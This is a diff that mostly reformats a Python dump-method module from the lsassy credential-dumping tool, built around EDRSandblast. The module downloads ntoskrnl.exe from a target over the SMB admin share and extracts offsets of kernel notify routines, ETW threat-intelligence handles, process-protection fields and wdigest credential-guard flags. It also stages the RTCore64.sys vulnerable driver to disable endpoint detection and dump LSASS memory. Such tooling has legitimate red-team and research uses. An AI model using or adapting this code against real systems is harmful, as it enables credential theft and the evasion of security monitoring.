@@ -1,6 +1,7 @@
 """
 https://github.com/wavestone-cdt/EDRSandblast
 """
+
 import os
 import random
 import string
@@ -11,7 +12,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 CSVLock = threading.Lock()
 
-from lsassy.dumpmethod import IDumpMethod, Dependency
+from lsassy.dumpmethod import Dependency, IDumpMethod
 from lsassy.logger import lsassy_logger
 
 machineType = dict(x86=332, x64=34404)
@@ -26,33 +27,46 @@ class DumpMethod(IDumpMethod):
         self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
         self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")
 
-        self.tmp_ntoskrnl = "lsassy_" + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32)) + ".exe"
-        
+        self.tmp_ntoskrnl = (
+            "lsassy_"
+            + "".join(
+                random.choice(string.ascii_letters + string.digits) for _ in range(32)
+            )
+            + ".exe"
+        )
 
     def prepare(self, options):
-        if os.name == 'nt':
-            tmp_dir = 'C:\\Windows\\Temp\\'
+        if os.name == "nt":
+            tmp_dir = "C:\\Windows\\Temp\\"
         else:
-            tmp_dir = '/tmp/'
-        with open('{}{}'.format(tmp_dir, self.tmp_ntoskrnl), 'wb') as p:
+            tmp_dir = "/tmp/"
+        with open("{}{}".format(tmp_dir, self.tmp_ntoskrnl), "wb") as p:
             try:
-                self._session.smb_session.getFile("C$", "\\Windows\\System32\\ntoskrnl.exe", p.write)
-                lsassy_logger.info("ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl))
+                self._session.smb_session.getFile(
+                    "C$", "\\Windows\\System32\\ntoskrnl.exe", p.write
+                )
+                lsassy_logger.info(
+                    "ntoskrnl.exe downloaded to {}{}".format(tmp_dir, self.tmp_ntoskrnl)
+                )
             except Exception as e:
                 lsassy_logger.error("ntoskrnl.exe download error", exc_info=True)
                 try:
-                    os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
+                    os.remove("{}{}".format(tmp_dir, self.tmp_ntoskrnl))
                 except Exception as e:
                     return None
                 return None
-        self.ntoskrnl.content = self.extractOffsets("{}{}".format(tmp_dir, self.tmp_ntoskrnl), "ntoskrnl")
+        self.ntoskrnl.content = self.extractOffsets(
+            "{}{}".format(tmp_dir, self.tmp_ntoskrnl), "ntoskrnl"
+        )
 
         if self.ntoskrnl.content is not None:
             lsassy_logger.info("ntoskrnl offsets extracted")
             lsassy_logger.debug(self.ntoskrnl.content.split("\n")[1])
-        os.remove('{}{}'.format(tmp_dir, self.tmp_ntoskrnl))
+        os.remove("{}{}".format(tmp_dir, self.tmp_ntoskrnl))
 
-        return self.prepare_dependencies(options, [self.edrsandblast, self.RTCore64, self.ntoskrnl])
+        return self.prepare_dependencies(
+            options, [self.edrsandblast, self.RTCore64, self.ntoskrnl]
+        )
 
     def clean(self):
         self.clean_dependencies([self.edrsandblast, self.RTCore64, self.ntoskrnl])
@@ -62,13 +76,11 @@ class DumpMethod(IDumpMethod):
             self.edrsandblast.get_remote_path(),
             self.RTCore64.get_remote_path(),
             self.ntoskrnl.get_remote_path(),
-            self.dump_path, self.dump_name
+            self.dump_path,
+            self.dump_name,
         )
 
-        return {
-            "cmd": cmd_command,
-            "pwsh": cmd_command
-        }
+        return {"cmd": cmd_command, "pwsh": cmd_command}
 
     def run(self, args, **kargs):
         """Wrap subprocess.run to works on Windows and Linux"""
@@ -102,7 +114,7 @@ class DumpMethod(IDumpMethod):
             if line.startswith("FileVersion:"):
                 return [int(frag) for frag in line.split(" ")[-1].split(".")]
 
-        lsassy_logger.debug(f'[!] ERROR : failed to extract version from {path}.')
+        lsassy_logger.debug(f"[!] ERROR : failed to extract version from {path}.")
         raise RuntimeError("get_file_version error")
 
     def extractOffsets(self, input_file, mode):
@@ -123,7 +135,9 @@ class DumpMethod(IDumpMethod):
 
             # todo : remove this and make a unique function
             if mode != imageType:
-                lsassy_logger.debug(f"[*] Skipping {input_file} since we are in {mode} mode")
+                lsassy_logger.debug(
+                    f"[*] Skipping {input_file} since we are in {mode} mode"
+                )
                 return
             if os.path.sep not in input_file:
                 input_file = "." + os.path.sep + input_file
@@ -131,34 +145,44 @@ class DumpMethod(IDumpMethod):
 
             # Checks if the image version is already present in the CSV
             extension = extensions_by_mode[imageType]
-            imageVersion = f'{imageType}_{full_version[2]}-{full_version[3]}.{extension}'
+            imageVersion = (
+                f"{imageType}_{full_version[2]}-{full_version[3]}.{extension}"
+            )
 
             if imageVersion in knownImageVersions[imageType]:
-                lsassy_logger.debug(f'[*] Skipping known {imageType} version {imageVersion} (file: {input_file})')
+                lsassy_logger.debug(
+                    f"[*] Skipping known {imageType} version {imageVersion} (file: {input_file})"
+                )
                 return
 
-            lsassy_logger.debug(f'[*] Processing {imageType} version {imageVersion} (file: {input_file})')
+            lsassy_logger.debug(
+                f"[*] Processing {imageType} version {imageVersion} (file: {input_file})"
+            )
             # download the PDB if needed
             r = self.run(["r2", "-c", "idpd", "-qq", input_file], capture_output=True)
             # dump all symbols
-            r = self.run(["r2", "-c", "idpi", "-qq", '-B', '0', input_file], capture_output=True)
+            r = self.run(
+                ["r2", "-c", "idpi", "-qq", "-B", "0", input_file], capture_output=True
+            )
             all_symbols_info = [line.strip() for line in r.stdout.decode().splitlines()]
 
             if imageType == "ntoskrnl":
-                symbols = [("PspCreateProcessNotifyRoutine", self.get_symbol_offset),
-                           ("PspCreateThreadNotifyRoutine", self.get_symbol_offset),
-                           ("PspLoadImageNotifyRoutine", self.get_symbol_offset),
-                           ('_PS_PROTECTION Protection', self.get_field_offset),
-                           ("EtwThreatIntProvRegHandle", self.get_symbol_offset),
-                           ('_ETW_GUID_ENTRY* GuidEntry', self.get_field_offset),
-                           ('_TRACE_ENABLE_INFO ProviderEnableInfo', self.get_field_offset),
-                           ("PsProcessType", self.get_symbol_offset),
-                           ("PsThreadType", self.get_symbol_offset),
-                           ('struct _LIST_ENTRY CallbackList', self.get_field_offset)]
+                symbols = [
+                    ("PspCreateProcessNotifyRoutine", self.get_symbol_offset),
+                    ("PspCreateThreadNotifyRoutine", self.get_symbol_offset),
+                    ("PspLoadImageNotifyRoutine", self.get_symbol_offset),
+                    ("_PS_PROTECTION Protection", self.get_field_offset),
+                    ("EtwThreatIntProvRegHandle", self.get_symbol_offset),
+                    ("_ETW_GUID_ENTRY* GuidEntry", self.get_field_offset),
+                    ("_TRACE_ENABLE_INFO ProviderEnableInfo", self.get_field_offset),
+                    ("PsProcessType", self.get_symbol_offset),
+                    ("PsThreadType", self.get_symbol_offset),
+                    ("struct _LIST_ENTRY CallbackList", self.get_field_offset),
+                ]
             elif imageType == "wdigest":
                 symbols = [
                     ("g_fParameter_UseLogonCredential", self.get_symbol_offset),
-                    ("g_IsCredGuardEnabled", self.get_symbol_offset)
+                    ("g_IsCredGuardEnabled", self.get_symbol_offset),
                 ]
 
             symbols_values = list()
@@ -171,12 +195,14 @@ class DumpMethod(IDumpMethod):
 
             knownImageVersions[imageType].append(imageVersion)
 
-            lsassy_logger.debug(f'[+] Finished processing of {imageType} {input_file}!')
+            lsassy_logger.debug(f"[+] Finished processing of {imageType} {input_file}!")
             lsassy_logger.debug(output_result)
             return output_result
 
         except Exception as e:
-            lsassy_logger.debug(f'[!] ERROR : Could not process file {input_file}.')
-            lsassy_logger.debug(f'[!] Error message: {e}')
-            lsassy_logger.debug(f'[!] If error is of the like of "\'NoneType\' object has no attribute \'group\'", kernel callbacks may not be supported by this version.')
+            lsassy_logger.debug(f"[!] ERROR : Could not process file {input_file}.")
+            lsassy_logger.debug(f"[!] Error message: {e}")
+            lsassy_logger.debug(
+                f"[!] If error is of the like of \"'NoneType' object has no attribute 'group'\", kernel callbacks may not be supported by this version."
+            )
             return None
